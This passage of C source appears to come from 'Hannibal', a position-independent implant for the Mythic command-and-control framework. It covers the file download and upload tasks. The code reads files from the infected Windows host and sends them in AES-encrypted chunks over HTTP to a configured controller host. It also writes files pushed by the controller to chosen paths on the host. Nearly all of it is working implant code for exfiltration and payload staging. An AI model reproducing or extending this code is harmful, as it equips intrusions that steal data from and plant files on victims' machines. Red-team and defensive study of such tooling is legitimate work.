            BUFFER_SIZE += sizeof(UINT8) + sizeof(UINT32) + pic_strlen(hannibal_instance_ptr->tasks.file_downloads[i].task_uuid); // Task UUID
            BUFFER_SIZE += sizeof(UINT8) + sizeof(UINT32) + pic_strlen(hannibal_instance_ptr->tasks.file_downloads[i].download_uuid); // Task UUID
            BUFFER_SIZE += sizeof(UINT8) + sizeof(UINT32) + sizeof(UINT32); // Chunk Number TLV
            BUFFER_SIZE += sizeof(UINT8) + sizeof(UINT32) + bytes_read; // Chunk of data

            int serialized_buffer_size = BUFFER_SIZE;
            // Freed in mythic_http_continue_file_downloads()
            char *serialized_buffer = (char *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, BUFFER_SIZE, MEM_COMMIT, PAGE_READWRITE);

            UINT8 *buffer_cursor = serialized_buffer;

             // UUID For Mythic
            // WriteString(&buffer_cursor, hannibal_instance_ptr->config.uuid, FALSE);

            // What kind of message is this
            WriteUint8(&buffer_cursor, MESSAGE_TYPE_CONTINUE_DOWNLOAD);

            // TASK GUID TLV
            WriteUint8(&buffer_cursor, TLV_POST_TASKING_ID);
            WriteUint32(&buffer_cursor, pic_strlen(hannibal_instance_ptr->tasks.file_downloads[i].task_uuid));
            WriteString(&buffer_cursor, hannibal_instance_ptr->tasks.file_downloads[i].task_uuid, FALSE);

            // Chunk Number
            WriteUint8(&buffer_cursor, TLV_CONTINUE_DOWNLOAD_CHUNK_NUMBER);
            WriteUint32(&buffer_cursor, sizeof(UINT32));
            WriteUint32(&buffer_cursor, hannibal_instance_ptr->tasks.file_downloads[i].chunks_sent + 1);

             // file_id
            WriteUint8(&buffer_cursor, TLV_CONTINUE_DOWNLOAD_FILE_ID);
            WriteUint32(&buffer_cursor, pic_strlen(hannibal_instance_ptr->tasks.file_downloads[i].download_uuid));
            WriteString(&buffer_cursor, hannibal_instance_ptr->tasks.file_downloads[i].download_uuid, FALSE);

            // The chunk data
            WriteUint8(&buffer_cursor, TLV_CONTINUE_DOWNLOAD_FILE_DATA);
            WriteUint32(&buffer_cursor, bytes_read);
            WriteBytes(&buffer_cursor, chunk_buffer, bytes_read);
            

            MYTHIC_HTTP_ENCRYPTION_MSG enc_resp = mythic_http_aes_encrypt(serialized_buffer, serialized_buffer_size);

            to_utility_http_wininet_msg send_msg;

            send_msg.dst_host = hannibal_instance_ptr->config.controller_host;
            send_msg.dst_url = hannibal_instance_ptr->config.controller_url;
            send_msg.http_method = hannibal_instance_ptr->config.http_method;
            send_msg.user_agent = hannibal_instance_ptr->config.user_agent;
            send_msg.content = enc_resp.buffer; 
            send_msg.content_length = enc_resp.buffer_size;
            

            from_utility_http_wininet_msg continue_download_response = http_wininet_request(send_msg);

            hannibal_instance_ptr->Win32.VirtualFree(send_msg.content, 0, MEM_RELEASE);
            hannibal_instance_ptr->Win32.CloseHandle(hFile);

            // Check was success
            if(continue_download_response.content == NULL){
                hannibal_instance_ptr->Win32.VirtualFree(chunk_buffer, 0, MEM_RELEASE);
                continue; // Try the next queued download
            }

            int resp_strlen = pic_strlen(continue_download_response.content);


            MYTHIC_HTTP_ENCRYPTION_MSG dec_resp = mythic_http_aes_decrypt(continue_download_response.content, resp_strlen);

            // If message corrupted/tampered with/other error
            if(dec_resp.buffer == NULL){
                hannibal_instance_ptr->Win32.VirtualFree(chunk_buffer, 0, MEM_RELEASE);
                hannibal_instance_ptr->Win32.VirtualFree(continue_download_response.content, 0, MEM_RELEASE);
                return;
            }

            UINT8 message_type = ReadUint8(&dec_resp.buffer);

            // TODO: Cleanup these types
            if(message_type != MESSAGE_TYPE_START_DOWNLOAD){
                hannibal_instance_ptr->Win32.VirtualFree(dec_resp.buffer, 0, MEM_RELEASE);
                hannibal_instance_ptr->Win32.VirtualFree(continue_download_response.content, 0, MEM_RELEASE);
                hannibal_instance_ptr->Win32.VirtualFree(chunk_buffer, 0, MEM_RELEASE);
                return NULL;
            }

            UINT8 status = ReadUint8(&dec_resp.buffer);

            if(status == 1){
                // If success increment
                hannibal_instance_ptr->tasks.file_downloads[i].bytes_sent += bytes_read;
                hannibal_instance_ptr->tasks.file_downloads[i].chunks_sent += 1;

                if (bytes_read < FILE_DOWNLOAD_CHUNK_SIZE){ // EOF
                    hannibal_instance_ptr->Win32.VirtualFree(hannibal_instance_ptr->tasks.file_downloads[i].task_uuid, 0, MEM_RELEASE);
                    hannibal_instance_ptr->Win32.VirtualFree(hannibal_instance_ptr->tasks.file_downloads[i].download_uuid, 0, MEM_RELEASE);
                    hannibal_instance_ptr->Win32.VirtualFree(hannibal_instance_ptr->tasks.file_downloads[i].path, 0, MEM_RELEASE);
                    hannibal_instance_ptr->tasks.file_downloads[i].bytes_sent = 0;
                    hannibal_instance_ptr->tasks.file_downloads[i].chunks_sent = 0;
                    hannibal_instance_ptr->tasks.file_downloads[i].chunk_count = 0;
                    hannibal_instance_ptr->tasks.file_downloads[i].filesize = 0;
                    hannibal_instance_ptr->tasks.download_count -= 1;
                }
            } 

            hannibal_instance_ptr->Win32.VirtualFree(dec_resp.buffer, 0, MEM_RELEASE);
            hannibal_instance_ptr->Win32.VirtualFree(chunk_buffer, 0, MEM_RELEASE);

        } else {
            continue;
        }
    }
}

#endif // INCLUDE_CMD_DOWNLOAD

/////////////////////////////////////////////////////// File Uploads Mythic > Agent

#ifdef INCLUDE_CMD_UPLOAD

/**
 * @brief Adds the requested file to the upload queue.
 * 
 * TODO: Reduce repeated code. Investigate odd memory allocation behaviour, potential leak. 
 *       Maybe use _CRTDBG_LEAK_CHECK_DF.
 * 
 * @param[in] upload A heap allocated struct. Has its contents copied into the upload queue.
 * 
 * @return void
 */
SECTION_CODE void mythic_http_start_file_upload(FILE_UPLOAD *upload)
{
    HANNIBAL_INSTANCE_PTR

    if (hannibal_instance_ptr->tasks.upload_count >= CONCURRENT_FILE_DOWNLOADS){
        hannibal_response(L"Exceeded upload queue limit.", upload->task_uuid);
        hannibal_instance_ptr->Win32.VirtualFree(upload->path, 0, MEM_RELEASE);
        hannibal_instance_ptr->Win32.VirtualFree(upload->upload_uuid, 0, MEM_RELEASE);
        hannibal_instance_ptr->Win32.VirtualFree(upload, 0, MEM_RELEASE);
        return;
    }

    // Create the initial file. Should be zero bytes.
    // TODO: Check dest is a file not an existing directory, currently gives error code 5

    HANDLE hFile = hannibal_instance_ptr->Win32.CreateFileW(
        upload->path, 
        GENERIC_READ | GENERIC_WRITE, 
        0, 
        NULL, 
        CREATE_NEW, // Throw error if exists
        FILE_ATTRIBUTE_NORMAL, 
        NULL
    );

    DWORD error_code = hannibal_instance_ptr->Win32.GetLastError();

    if(hFile == INVALID_HANDLE_VALUE){
        hannibal_instance_ptr->Win32.CloseHandle(hFile);
        WCHAR code_buffer[20] = {0};
        WCHAR error_message[256] = {0};
        pic_strcatW(error_message, L"Error Code: ");
        dword_to_wchar(error_code, code_buffer, 10);
        pic_strcatW(error_message, code_buffer);
        hannibal_response(error_message, upload->task_uuid);
        hannibal_instance_ptr->Win32.VirtualFree(upload->path, 0, MEM_RELEASE);
        hannibal_instance_ptr->Win32.VirtualFree(upload->upload_uuid, 0, MEM_RELEASE);
        hannibal_instance_ptr->Win32.VirtualFree(upload, 0, MEM_RELEASE);
        return;
    }

    hannibal_instance_ptr->tasks.upload_count += 1;
    hannibal_instance_ptr->tasks.file_uploads[hannibal_instance_ptr->tasks.upload_count - 1] = *upload;

    hannibal_instance_ptr->Win32.VirtualFree(upload, 0, MEM_RELEASE);

    hannibal_instance_ptr->Win32.CloseHandle(hFile);
    
}


/**
 * @brief Gets the next chunk for each queued upload.
 * 
 * TODO: Reduce repeated code. Investigate odd memory allocation behaviour, potential leak. 
 *       Maybe use _CRTDBG_LEAK_CHECK_DF.
 * 
 * @return void
 */
SECTION_CODE void mythic_http_continue_file_uploads()
{
    HANNIBAL_INSTANCE_PTR

    for(int i = 0; i < hannibal_instance_ptr->tasks.upload_count; i++){
        if (hannibal_instance_ptr->tasks.file_uploads[i].upload_uuid != NULL){

            // Open file for writing and set pointer to how many bytes we've received.

            // TODO: Check for errors
             HANDLE hFile = hannibal_instance_ptr->Win32.CreateFileW(
                hannibal_instance_ptr->tasks.file_uploads[i].path, 
                GENERIC_READ | GENERIC_WRITE, 
                0, 
                NULL, 
                OPEN_ALWAYS, // Open the file if it exists, otherwise create it
                FILE_ATTRIBUTE_NORMAL, 
                NULL
            );

            hannibal_instance_ptr->Win32.SetFilePointer(
                hFile,
                hannibal_instance_ptr->tasks.file_uploads[i].bytes_received, 
                NULL, 
                FILE_BEGIN
            );

            // Request the next chunk

            int BUFFER_SIZE = 0;
            BUFFER_SIZE += sizeof(UINT8); // Message Type
            BUFFER_SIZE += sizeof(UINT8) + sizeof(UINT32) + pic_strlen(hannibal_instance_ptr->tasks.file_uploads[i].task_uuid); // Task UUID
            BUFFER_SIZE += sizeof(UINT8) + sizeof(UINT32) + pic_strlen(hannibal_instance_ptr->tasks.file_uploads[i].upload_uuid); // File ID
            BUFFER_SIZE += sizeof(UINT8) + sizeof(UINT32) + pic_strlenW(hannibal_instance_ptr->tasks.file_uploads[i].path)*sizeof(WCHAR); // File Path
            BUFFER_SIZE += sizeof(UINT8) + sizeof(UINT32) + sizeof(UINT32); // Chunk Number TLV
            BUFFER_SIZE += sizeof(UINT32); // Chunk size

            int serialized_buffer_size = BUFFER_SIZE;
            char *serialized_buffer = (char *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, BUFFER_SIZE, MEM_COMMIT, PAGE_READWRITE);

            UINT8 *buffer_cursor = serialized_buffer;

            // What kind of message is this
            WriteUint8(&buffer_cursor, MESSAGE_TYPE_FILE_UPLOAD);

            // TASK GUID TLV
            WriteUint8(&buffer_cursor, TLV_POST_TASKING_ID);
            WriteUint32(&buffer_cursor, pic_strlen(hannibal_instance_ptr->tasks.file_uploads[i].task_uuid));
            WriteString(&buffer_cursor, hannibal_instance_ptr->tasks.file_uploads[i].task_uuid, FALSE);

            // Chunk Number
            WriteUint8(&buffer_cursor, TLV_UPLOAD_CHUNK_NUMBER);
            WriteUint32(&buffer_cursor, sizeof(UINT32));
            WriteUint32(&buffer_cursor, hannibal_instance_ptr->tasks.file_uploads[i].chunks_received + 1);

             // file_id
            WriteUint8(&buffer_cursor, TLV_UPLOAD_FILE_UUID);
            WriteUint32(&buffer_cursor, pic_strlen(hannibal_instance_ptr->tasks.file_uploads[i].upload_uuid));
            WriteString(&buffer_cursor, hannibal_instance_ptr->tasks.file_uploads[i].upload_uuid, FALSE);

            // Chunk Size
            WriteUint8(&buffer_cursor, TLV_UPLOAD_CHUNK_SIZE);
            WriteUint32(&buffer_cursor, sizeof(UINT32));
            WriteUint32(&buffer_cursor, FILE_UPLOAD_CHUNK_SIZE);

            // Full path
            WriteUint8(&buffer_cursor, TLV_UPLOAD_REMOTE_PATH);
            WriteUint32(&buffer_cursor, pic_strlenW(hannibal_instance_ptr->tasks.file_uploads[i].path));
            WriteStringW(&buffer_cursor, hannibal_instance_ptr->tasks.file_uploads[i].path, FALSE);
            

            MYTHIC_HTTP_ENCRYPTION_MSG enc_resp = mythic_http_aes_encrypt(serialized_buffer, serialized_buffer_size);
            
            to_utility_http_wininet_msg send_msg;

            send_msg.dst_host = hannibal_instance_ptr->config.controller_host;
            send_msg.dst_url = hannibal_instance_ptr->config.controller_url;
            send_msg.http_method = hannibal_instance_ptr->config.http_method;
            send_msg.user_agent = hannibal_instance_ptr->config.user_agent;
            send_msg.content = enc_resp.buffer; 
            send_msg.content_length = enc_resp.buffer_size;

            from_utility_http_wininet_msg continue_upload_response = http_wininet_request(send_msg);

            hannibal_instance_ptr->Win32.VirtualFree(send_msg.content, 0, MEM_RELEASE);

            if(continue_upload_response.content == NULL){
                continue; // Try the next queued upload
            }

            int resp_strlen = pic_strlen(continue_upload_response.content);


            MYTHIC_HTTP_ENCRYPTION_MSG dec_resp = mythic_http_aes_decrypt(continue_upload_response.content, resp_strlen);

            buffer_cursor = dec_resp.buffer;

            UINT8 message_type = ReadUint8(&buffer_cursor);

            if(message_type != MESSAGE_TYPE_FILE_UPLOAD){
                return NULL;
            }

            UINT8 status =  ReadUint8(&buffer_cursor);

            if (status == 0){
                continue;
            }

            UINT32 total_chunks = ReadUint32(&buffer_cursor);

            hannibal_instance_ptr->tasks.file_uploads[i].chunk_count = total_chunks;
            
            UINT32 chunk_num = ReadUint32(&buffer_cursor);
            UINT32 chunk_size = ReadUint32(&buffer_cursor);
            

            DWORD bytes_written = 0;
            BOOL result = hannibal_instance_ptr->Win32.WriteFile(
                hFile,             
                buffer_cursor,           
                chunk_size,      
                &bytes_written,   
                NULL             
            );

            if(result){
                hannibal_instance_ptr->tasks.file_uploads[i].bytes_received += bytes_written;
                hannibal_instance_ptr->tasks.file_uploads[i].chunks_received += 1;
            }

            if (bytes_written < FILE_UPLOAD_CHUNK_SIZE) { //EOF
                hannibal_instance_ptr->Win32.VirtualFree(hannibal_instance_ptr->tasks.file_uploads[i].path, 0, MEM_RELEASE);
                hannibal_instance_ptr->Win32.VirtualFree(hannibal_instance_ptr->tasks.file_uploads[i].task_uuid, 0, MEM_RELEASE);
                hannibal_instance_ptr->Win32.VirtualFree(hannibal_instance_ptr->tasks.file_uploads[i].upload_uuid, 0, MEM_RELEASE);
                hannibal_instance_ptr->tasks.file_uploads[i].bytes_received = 0;
                hannibal_instance_ptr->tasks.file_uploads[i].chunk_count = 0;
                hannibal_instance_ptr->tasks.file_uploads[i].chunks_received = 0;
                hannibal_instance_ptr->tasks.file_uploads[i].filesize = 0;
                hannibal_instance_ptr->tasks.upload_count -= 1;
            } 

            hannibal_instance_ptr->Win32.VirtualFree(continue_upload_response.content, 0, MEM_RELEASE);
            hannibal_instance_ptr->Win32.VirtualFree(dec_resp.buffer, 0, MEM_RELEASE);

            hannibal_instance_ptr->Win32.CloseHandle(hFile);

        }
    }
}

#endif // INCLUDE_CMD_UPLOAD